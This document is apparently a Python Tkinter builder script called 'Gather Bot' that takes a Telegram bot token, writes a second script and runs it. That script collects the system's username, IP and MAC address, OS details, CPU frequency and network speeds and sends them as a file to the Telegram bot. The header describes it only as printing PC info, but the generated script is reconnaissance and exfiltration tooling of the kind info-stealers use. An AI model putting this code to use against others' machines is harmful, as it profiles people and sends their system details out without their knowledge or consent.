# Gather Bot GUI (Tkinter).
# This script prints out info about PC.
#
# Nyukers (C)opyright, 2021.
#
# -*- set coding: utf-8 -*- 

from tkinter import *
from tkinter import messagebox as mb
from PIL import ImageTk, Image
import webbrowser
import os

def clicked():
    system = open("Gather01.py", "w")
    system.write('''
import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
import speedtest
import telebot
import psutil
import platform
from PIL import Image
#
bot = telebot.TeleBot("''' + API.get() + '''")
#
start = datetime.now()
#
# Username, IP, MAC, OS
name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()
# Download, Upload, Ping
inet = speedtest.Speedtest()
inet.get_best_server()
download = float(str(inet.download())[0:2] + "." + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "." + str(round(inet.upload(), 2))[1]) * 0.125
# Timezone	
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
# CPU Frequency
cpu = psutil.cpu_freq()
ends = datetime.now()
workspeed = format(ends - start)
# Result
try:
    os.chdir(r"/temp")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()
    bot.polling()
    raise SystemExit
file = open("info.txt", "w")
file.write(f"================================================\\n  Operating System: {ost.system}\\n  Processor: {ost.processor}\\n  Username: {name}\\n  IP adress: {ip}\\n  MAC adress: {mac}\\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\\n  Work speed: {workspeed}\\n  Download: {download} MBs\\n  Upload: {uploads} MBs\\n  Max Frequency: {cpu.max:.2f} Mhz\\n  Min Frequency: {cpu.min:.2f} Mhz\\n  Current Frequency: {cpu.current:.2f} Mhz\\n================================================\\n")
file.close()
# Bot
@bot.message_handler(commands=['start'])
def start_message(message):
    upfile = open("info.txt", "rb")
    bot.send_document(message.chat.id, upfile)
    upfile.close()
    os.remove("info.txt")
    bot.stop_polling()
bot.polling()
''')
    system.close()
	
#    print(API.get())
    if API.get() == "":
        mb.showwarning("WARNING", "There are empty fields")
    else:
        os.system('python Gather01.py')
        mb.showinfo("INFO", "The Gathering info is ready! Check your Bot.")

def clicked2():
    answer = mb.askyesno(title="Redirecting", message="Go to GitHub?")
    if answer:
        webbrowser.open("https://github.com/nyukers/infocat", new=2)
    else:
        pass
		
root = Tk()
root.title("Gather Bot")   # Название программы
root.geometry("300x450")   # Разрешение окна программы

img = Image.open("logo.jpg")
image = ImageTk.PhotoImage(img)

initil = Label(root, image=image)
initil.place(relx=.5, rely=.2, anchor="center")

text = Label(root, text="Telegram Bot token", bg="#000000", fg="#ffffff")
text.place(relx=.5, rely=.5, anchor="center")

API = Entry(root, width=20, bg="#8c8c8c")
API.place(relx=.5, rely=.55, anchor="center")

text2 = Label(root, text="Path to save info-files", bg="#000000", fg="#ffffff")
text2.place(relx=.5, rely=.60, anchor="center")

direct = Entry(root, width=20, bg="#8c8c8c")
direct.place(relx=.5, rely=.65, anchor="center")

button = Button(root, text="Start", command=clicked, background="#ffea00", height=2, width=10)
button.place(relx=.5, rely=.85, anchor="center")

help = Button(root, text="Help", command=clicked2, background="#ffea00", height=1, width=10)
help.place(relx=.5, rely=.95, anchor="center")

root.mainloop()
